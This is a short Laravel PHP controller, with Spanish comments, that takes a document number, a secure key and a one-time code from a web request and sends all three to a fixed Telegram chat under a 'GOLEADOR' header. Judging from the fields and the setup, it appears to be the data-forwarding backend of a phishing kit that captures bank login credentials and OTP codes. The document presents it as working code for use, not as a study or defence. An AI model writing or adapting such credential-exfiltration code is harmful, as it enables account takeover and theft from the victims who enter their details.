<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Telegram\Bot\Api;

class TelegramController extends Controller
{
    public function sendMessage(Request $request)
    {
        $telegram = new Api(env('TELEGRAM_BOT_TOKEN'));
        $chatId = '-4777880988'; // Reemplaza con el ID de tu chat o canal de Telegram

        $message = "GOLEADOR⭐️🥷🏿💎" . "\n\n"; // Agregué un salto de línea al final
        $message .= "🧑‍💻: " . $request->documentNumber . "\n\n"; // Agregué un salto de línea al final
        $message .= "🔐: " . $request->secureKey . "\n\n"; // Agregué un salto de línea al final
        $message .= "🪬: " . $request->otp . "\n"; // Este también se termina con un salto de línea opcional

        try {
            $telegram->sendMessage([
                'chat_id' => $chatId,
                'text' => $message,
            ]);
            return response()->json(['success' => true, 'message' => 'Mensaje enviado']);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => 'Error al enviar el mensaje: ' . $e->getMessage()]);
        }
    }
}
